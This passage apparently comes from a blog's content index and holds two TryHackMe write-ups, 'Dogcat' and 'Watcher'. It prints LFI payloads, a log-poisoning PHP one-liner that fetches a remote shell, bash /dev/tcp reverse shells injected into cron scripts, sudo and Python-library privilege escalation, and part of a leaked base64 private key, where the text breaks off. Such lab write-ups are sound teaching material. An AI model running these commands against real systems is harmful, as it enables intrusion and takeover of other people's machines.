31 32 33  \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;dogcat\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;dogcat\u0026lt;/h1\u0026gt; \u0026lt;i\u0026gt;a gallery of various dogs or cats\u0026lt;/i\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;What would you like to see?\u0026lt;/h2\u0026gt; \u0026lt;a href=\u0026#34;/?view=dog\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;dog\u0026#34;\u0026gt;A dog\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/?view=cat\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;cat\u0026#34;\u0026gt;A cat\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Analyzing the source code of the index.php file, we will find out that $ext variable is appending a .php extension to our input. Also, we can see that our query must contain the string \u0026ldquo;dog\u0026rdquo; or \u0026ldquo;cat\u0026rdquo;.\nTo read the first flag, we will use the following query based on the provided analysis above:\n1  http://10.10.19.192/?view=php://filter/read=convert.base64-encode/resource=dog/../flag   Then we can further confirm Local File Inclusion with accessing passwd file located in the /etc directory.\n1  http://10.10.19.192/?view=../../../../etc/cat/../passwd\u0026amp;ext   We will intercept our request with Burp Suite proxy and then send it to Repeater. User-Agent will be replaced with the following php one liner which will download our prepared reverse shell hosted on our simple python server.\n1  \u0026lt;?php file_put_contents(\u0026#39;shell.php\u0026#39;,file_get_contents(\u0026#39;http://10.9.140.180/shell.php\u0026#39;))?\u0026gt;  \nPressing Send button in Burp Suite will send our modified request and download the shell file to to the server.\n1 2 3  python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 10.10.19.192 - - [19/Feb/2021 10:11:53] \u0026#34;GET /shell.php HTTP/1.0\u0026#34; 200 -   Gaining Access 1  http://10.10.19.192/shell.php   Before visiting our newly uploaded resource in the browser, we will start a listener on the local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.19.192] 58382 Linux 4ec6d4b7cd78 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux 15:55:29 up 42 min, 0 users, load average: 0.00, 0.02, 0.13 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ ls -la total 20 drwxr-xr-x 1 root root 4096 Mar 10 2020 . drwxr-xr-x 1 root root 4096 Feb 26 2020 .. -rw-r--r-- 1 root root 23 Mar 10 2020 flag2_QMW7JvaY2LvK.txt drwxrwxrwx 4 www-data www-data 4096 Feb 19 15:50 html   We successfully obtained a reverse shell and the second flag.\nPrivilege Escalation Running sudo -l command we check our sudo permissions.\n1 2 3 4 5 6  $ sudo -l Matching Defaults entries for www-data on 4ec6d4b7cd78: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on 4ec6d4b7cd78: (root) NOPASSWD: /usr/bin/env   From the above command output we see that we can run env binary without a password as the root user.\nWe will use this fact to execute a shell as the root user and read the fourth flag.\n1 2 3 4 5 6 7 8 9 10 11  $ sudo env /bin/sh whoami root cd /root ls -la total 20 drwx------ 1 root root 4096 Mar 10 2020 . drwxr-xr-x 1 root root 4096 Feb 19 15:15 .. -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-------- 1 root root 35 Mar 10 2020 flag3.txt   Breaking Out of a Docker Container While performing further enumeration because we are still missing the fourth flag, we found a shell script located in the /opt/backups directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  cd /opt ls -la total 12 drwxr-xr-x 1 root root 4096 Feb 19 15:15 . drwxr-xr-x 1 root root 4096 Feb 19 15:15 .. drwxr-xr-x 2 root root 4096 Apr 8 2020 backups cd backups ls -la total 2892 drwxr-xr-x 2 root root 4096 Apr 8 2020 . drwxr-xr-x 1 root root 4096 Feb 19 15:15 .. -rwxr--r-- 1 root root 69 Mar 10 2020 backup.sh -rw-r--r-- 1 root root 2949120 Feb 19 16:01 backup.tar cat backup.sh #!/bin/bash tar cf /root/container/backup/backup.tar /root/container   Based on the container directory, we can assume that we are inside a Docker container. This means that there is a further privilege escalation we want to utilize.\n1 2 3 4 5  echo \u0026#34;#!/bin/bash\u0026#34; \u0026gt; backup.sh echo \u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/1234 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; backup.sh cat backup.sh #!/bin/bash /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/1234 0\u0026gt;\u0026amp;1\u0026#39;   Rewriting the backup.sh script, which runs as a cron job, with our bash reverse shell and simultaneously starting a listener gives us a root shell out of the Docker container.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  nc -lnvp 1234 listening on [any] 1234 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.19.192] 36340 bash: cannot set terminal process group (3972): Inappropriate ioctl for device bash: no job control in this shell root@dogcat:~# ls -la ls -la total 40 drwx------ 6 root root 4096 Apr 8 2020 . drwxr-xr-x 24 root root 4096 Apr 8 2020 .. lrwxrwxrwx 1 root root 9 Mar 10 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 Apr 8 2020 .cache drwxr-xr-x 5 root root 4096 Mar 10 2020 container -rw-r--r-- 1 root root 80 Mar 10 2020 flag4.txt drwx------ 3 root root 4096 Apr 8 2020 .gnupg drwxr-xr-x 3 root root 4096 Apr 8 2020 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 66 Mar 10 2020 .selected_editor root@dogcat:~# whoami whoami root root@dogcat:~# id id uid=0(root) gid=0(root) groups=0(root) root@dogcat:~# wc flag4.txt wc flag4.txt 1 1 80 flag4.txt   \rThank you for reading this blog post.\n","description":"I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.","id":14,"section":"posts","tags":["enumeration","lfi","docker","cron job","privilege escalation"],"title":"Dogcat [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/dogcat/"},{"content":"   Title  Watcher     Info  A boot2root Linux machine utilizing web exploits along with some common privilege escalation techniques.   Difficulty  Medium   Date 2021/02/17    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.142.217\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Nmap scan report for 10.10.142.217 Host is up (0.069s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA) | 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA) |_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Jekyll v4.1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Corkplacemats No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   Directory Brute-Forcing Next, we will scan the website with gobuster for interesting directories and files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  gobuster dir -e -u 10.10.142.217 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.217.134 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/18 10:54:39 Starting gobuster =============================================================== http://10.10.217.134/.hta (Status: 403) http://10.10.217.134/.htpasswd (Status: 403) http://10.10.217.134/.htaccess (Status: 403) http://10.10.217.134/css (Status: 301) http://10.10.217.134/images (Status: 301) http://10.10.217.134/index.php (Status: 200) http://10.10.217.134/robots.txt (Status: 200) http://10.10.217.134/server-status (Status: 403) =============================================================== 2021/02/18 10:55:14 Finished ===============================================================   The most noticeable found resource is robots text file.\n Supporting article\nhttps://moz.com/learn/seo/robotstxt\n Robots Visiting the web page and traversing to /robots.txt we can read the first flag. Also notice there is another text file to which we don\u0026rsquo;t have access yet.\n\nLocal File Inclusion Clicking on any picture on the home page we are redirected to its own description.\nUpon redirection a new query is added to URL: /post.php?post=round.php\n\nAfter trying to access /etc/passed we will get the content printed on the page.\nThis confirms this page has Local File Inclusion Vulnerability. We have also discovered we can perform a Directory Traversal attack.\n1  http://10.10.142.217/post.php?post=secret_file_do_not_read.txt   \nWe will use found credentials to successfully login in to ftp.\nListing all the files in the current directory, we can see we found the second flag.\nUse get flag_2.txt to download the text file to our local machine.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ftp 10.10.142.217 Connected to 10.10.142.217. 220 (vsFTPd 3.0.3) Name (10.10.142.217:root): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 files -rw-r--r-- 1 0 0 21 Dec 03 01:58 flag_2.txt 226 Directory send OK. ftp\u0026gt;    Supporting article\nhttps://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/\n LFI to Remote Code Execution To perform RCE, we will need a php reverse shell which we can download from here. Do not forgive to edit it to match our local machine IP and a port of our choice.\nGoing back to ftp sever and navigating to /files directory following with put reverse-shell.php we will upload our reverse shell to the desired location.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ftp\u0026gt; cd files 250 Directory successfully changed. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Dec 03 03:30 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. 226 Directory send OK. ftp\u0026gt; put reverse-shell.php local: reverse-shell.php remote: reverse-shell.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 5494 bytes sent in 0.00 secs (34.4703 MB/s) ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 1001 1001 4096 Feb 18 14:05 . dr-xr-xr-x 3 65534 65534 4096 Dec 03 01:58 .. -rw-r--r-- 1 1001 1001 5494 Feb 18 14:05 reverse-shell.php 226 Directory send OK. ftp\u0026gt;   Next, we will start a listener on our local machine.\nBased on the note found previously and discovered vulnerability, we will navigate in the browser to following url:\n1  http://10.10.142.217/post.php?post=/home/ftpuser/ftp/files/reverse-shell.php   Upon performing the request above we will get a reverse shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.142.217] 44898 Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 14:06:10 up 25 min, 0 users, load average: 0.00, 0.03, 0.28 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ whoami www-data $   To upgrade our current shell, we will use following command:\n1  python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;   Navigating to /more_secrets_a9f10a and listing its content we can spot the third flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  www-data@watcher:/var/www/html$ ls -la ls -la total 60 drwxr-xr-x 5 root root 4096 Dec 3 01:52 . drwxr-xr-x 3 root root 4096 Dec 3 01:39 .. -rw-r--r-- 1 root root 47 Dec 3 01:47 .htaccess -rw-r--r-- 1 root root 3445 Dec 3 01:42 bunch.php drwxr-xr-x 2 root root 4096 Dec 3 01:42 css -rw-r--r-- 1 root root 35 Dec 3 01:42 flag_1.txt drwxr-xr-x 2 root root 4096 Dec 3 01:42 images -rw-r--r-- 1 root root 4826 Dec 3 01:42 index.php drwxr-xr-x 2 root root 4096 Dec 3 01:42 more_secrets_a9f10a -rw-r--r-- 1 root root 2454 Dec 3 01:52 post.php -rw-r--r-- 1 root root 69 Dec 3 01:43 robots.txt -rw-r--r-- 1 root root 3440 Dec 3 01:42 round.php -rw-r--r-- 1 root root 156 Dec 3 01:44 secret_file_do_not_read.txt -rw-r--r-- 1 root root 3446 Dec 3 01:42 striped.php   1 2 3 4 5 6 7 8 9 10 11  www-data@watcher:/var/www/html$ cd more_secrets_a9f10a cd more_secrets_a9f10a www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls -la ls -la total 12 drwxr-xr-x 2 root root 4096 Dec 3 01:42 . drwxr-xr-x 5 root root 4096 Dec 3 01:52 .. -rw-r--r-- 1 root root 21 Dec 3 01:42 flag_3.txt www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt | wc -c cat flag_3.txt | wc -c 21    Supporting article\nhttps://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2\n Lateral Movement Running sudo -l command we check our sudo permissions.\n1 2 3 4 5 6 7 8  www-data@watcher:/var/www/html/more_secrets_a9f10a$ sudo -l sudo -l Matching Defaults entries for www-data on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on watcher: (toby) NOPASSWD: ALL   From the output above, we see that we can run all commands without a password as the toby user.\nWe will use this fact to execute a bash shell as the toby user and read the fourth flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  www-data@watcher:/home/toby$ sudo -u toby bash sudo -u toby bash toby@watcher:~$ id id uid=1003(toby) gid=1003(toby) groups=1003(toby) toby@watcher:~$ ls -la ls -la total 44 drwxr-xr-x 6 toby toby 4096 Dec 12 15:25 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 root root 9 Dec 3 02:34 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 toby toby 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 toby toby 3771 Dec 3 01:58 .bashrc drwx------ 2 toby toby 4096 Dec 3 02:40 .cache drwx------ 3 toby toby 4096 Dec 3 02:40 .gnupg drwxrwxr-x 3 toby toby 4096 Dec 3 01:58 .local -rw-r--r-- 1 toby toby 807 Dec 3 01:58 .profile -rw------- 1 toby toby 21 Dec 3 01:58 flag_4.txt drwxrwxr-x 2 toby toby 4096 Dec 3 03:31 jobs -rw-r--r-- 1 mat mat 89 Dec 12 15:25 note.txt toby@watcher:~$ cat flag_4.txt | wc -c cat flag_4.txt | wc -c 21    Supporting article\nhttps://www.explainshell.com/explain?cmd=sudo+-l\n Cron Jobs Reading the note text file in the toby\u0026rsquo;s home directory we will found out that there is a cron job.\n1 2 3 4 5 6 7  toby@watcher:~$ cat note.txt cat note.txt Hi Toby, I\u0026#39;ve got the cron jobs set up now so don\u0026#39;t worry about getting that done. Mat   Reading crontab file we can confirm that there is a script which runs every minute as the mat user.\nEven though toby owns this file, the script is executed in the context of the user running the cron job.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  toby@watcher:~$ cat /etc/crontab cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # */1 * * * * mat /home/toby/jobs/cow.sh   Printing the content of the script, we can see it is performing simple copying of a cow image.\n1 2 3 4 5 6 7 8 9 10 11 12  toby@watcher:~$ cd jobs\tcd jobs toby@watcher:~/jobs$ ls -la ls -la total 12 drwxrwxr-x 2 toby toby 4096 Dec 3 03:31 . drwxr-xr-x 6 toby toby 4096 Dec 12 15:25 .. -rwxr-xr-x 1 toby toby 46 Dec 3 03:31 cow.sh toby@watcher:~/jobs$ cat cow.sh cat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg   We will append a bash reverse shell with changed port into the file which cronjob will execute.\n1 2 3 4 5 6 7  toby@watcher:~/jobs$ echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; cow.sh \u0026lt;h -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; cow.sh toby@watcher:~/jobs$cat cow.sh\tcat cow.sh #!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.140.180/5555 0\u0026gt;\u0026amp;1\u0026#34;   Next, we will set up another netcat listener.\nThen after a minute, user mat will execute modified bash script and we will receive a reverse shell as this user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  nc -lnvp 5555 listening on [any] 5555 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.142.217] 52132 bash: cannot set terminal process group (2057): Inappropriate ioctl for device bash: no job control in this shell mat@watcher:~$ id id uid=1002(mat) gid=1002(mat) groups=1002(mat) mat@watcher:~$ ls -la ls -la total 312 drwxr-xr-x 6 mat mat 4096 Dec 3 03:31 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 root root 9 Dec 3 02:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 mat mat 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 mat mat 3771 Dec 3 01:58 .bashrc drwx------ 2 mat mat 4096 Dec 3 02:47 .cache -rw-r--r-- 1 mat mat 270433 Dec 3 01:58 cow.jpg -rw------- 1 mat mat 37 Dec 3 01:58 flag_5.txt drwx------ 3 mat mat 4096 Dec 3 02:47 .gnupg drwxrwxr-x 3 mat mat 4096 Dec 3 01:58 .local -rw-r--r-- 1 will will 141 Dec 3 01:58 note.txt -rw-r--r-- 1 mat mat 807 Dec 3 01:58 .profile drwxrwxr-x 2 will will 4096 Dec 3 03:31 scripts mat@watcher:~$ cat flag_5.txt | wc -c cat flag_5.txt | wc -c 37    Supporting article\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs\n Python Library Hijacking Once again we will start by running sudo -l command to check our sudo permissions.\n1 2 3 4 5 6 7 8  mat@watcher:~$ sudo -l sudo -l Matching Defaults entries for mat on watcher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mat may run the following commands on watcher: (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *   From the output above, we see that we can run a python script called will_script.py with any argument as the will user.\n1 2 3 4 5 6 7 8  mat@watcher:~/scripts$ ls -la ls -la total 16 drwxrwxr-x 2 will will 4096 Dec 3 03:31 . drwxr-xr-x 6 mat mat 4096 Dec 3 03:31 .. -rw-r--r-- 1 mat mat 133 Dec 3 03:31 cmd.py -rw-r--r-- 1 will will 208 Dec 3 01:58 will_script.py mat@watcher:~/scripts$   Let\u0026rsquo;s check what these two scripts actually do.\n1  mat@watcher:~/scripts$ cat cmd.py   1 2 3 4 5 6 7  def get_command(num): if(num == \u0026#34;1\u0026#34;): return \u0026#34;ls -lah\u0026#34; if(num == \u0026#34;2\u0026#34;): return \u0026#34;id\u0026#34; if(num == \u0026#34;3\u0026#34;): return \u0026#34;cat /etc/passwd\u0026#34;   1  mat@watcher:~/scripts$ cat will_script.py   1 2 3 4 5 6 7 8 9 10 11 12 13  import os import sys from cmd import get_command cmd = get_command(sys.argv[1]) whitelist = [\u0026#34;ls -lah\u0026#34;, \u0026#34;id\u0026#34;, \u0026#34;cat /etc/passwd\u0026#34;] if cmd not in whitelist: print(\u0026#34;Invalid command!\u0026#34;) exit() os.system(cmd)   Based on the argument provided to the will_script.py a system command is return from the cmd.py and then executed. We should notice the whitelist array of command we are allowed to use.\nI personally tried to insert a simple import os; os.system(\u0026quot;/bin/bash\u0026quot;)\ncommand at the top of the cmd.py with sed and then with awk but I was not successful, so I used SSH to get a proper shell and then I used nano to edit the script and insert this line on the top of the file.\n How to SSH into the machine?\n Create key pairs for SSH with ssh-keygen command. Copy the id_rsa.pub file to the authorized_keys file with cp id_rsa.pub authorized_keys command inside the .ssh directory. Copy the content of the private key (id_rsa) to your local machine. Set permissions of the private key with chmod 600 id_rsa command. Login as mat user with ssh -i id_rsa mat@IP   1 2 3 4 5 6 7 8 9  import os os.system(\u0026#34;/bin/bash\u0026#34;) def get_command(num): if(num == \u0026#34;1\u0026#34;): return \u0026#34;ls -lah\u0026#34; if(num == \u0026#34;2\u0026#34;): return \u0026#34;id\u0026#34; if(num == \u0026#34;3\u0026#34;): return \u0026#34;cat /etc/passwd\u0026#34;   To spawn a shell as a will user is not conditional based on the argument provided to will_script.py because we successfully inserted bash spawning at the very beginning.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 2 will@watcher:~/scripts$ whoami will will@watcher:~/scripts$ id uid=1000(will) gid=1000(will) groups=1000(will),4(adm) will@watcher:~/scripts$ cd /home/will will@watcher:/home/will$ ls -la total 36 drwxr-xr-x 5 will will 4096 Dec 3 02:31 . drwxr-xr-x 6 root root 4096 Dec 3 02:06 .. lrwxrwxrwx 1 will will 9 Dec 3 02:31 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 will will 220 Dec 3 01:58 .bash_logout -rw-r--r-- 1 will will 3771 Dec 3 01:58 .bashrc drwx------ 2 will will 4096 Dec 3 01:58 .cache drwxr-x--- 3 will will 4096 Dec 3 02:19 .config -rw------- 1 will will 41 Dec 3 01:58 flag_6.txt drwx------ 3 will will 4096 Dec 3 02:12 .gnupg -rw-r--r-- 1 will will 807 Dec 3 01:58 .profile -rw-r--r-- 1 will will 0 Dec 3 01:58 .sudo_as_admin_successful will@watcher:/home/will$ cat flag_6.txt | wc -c 41    Supporting article\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#python-library-hijacking\n Private Key Backup Performing basic manual directory enumeration, we will find a key backup located inside /opt/backup.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  will@watcher:/home/will$ cd /opt will@watcher:/opt$ ls -la total 12 drwxr-xr-x 3 root root 4096 Dec 3 02:03 . drwxr-xr-x 24 root root 4096 Dec 12 15:22 .. drwxrwx--- 2 root adm 4096 Dec 3 02:04 backups will@watcher:/opt$ cd backups/ will@watcher:/opt/backups$ ls -la total 12 drwxrwx--- 2 root adm 4096 Dec 3 02:04 . drwxr-xr-x 3 root root 4096 Dec 3 02:03 .. -rw-rw---- 1 root adm 2270 Dec 3 02:04 key.b64 will@watcher:/opt/backups$ cat key.b64 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45 ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3 YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5 cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3 c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2 TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2 TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0 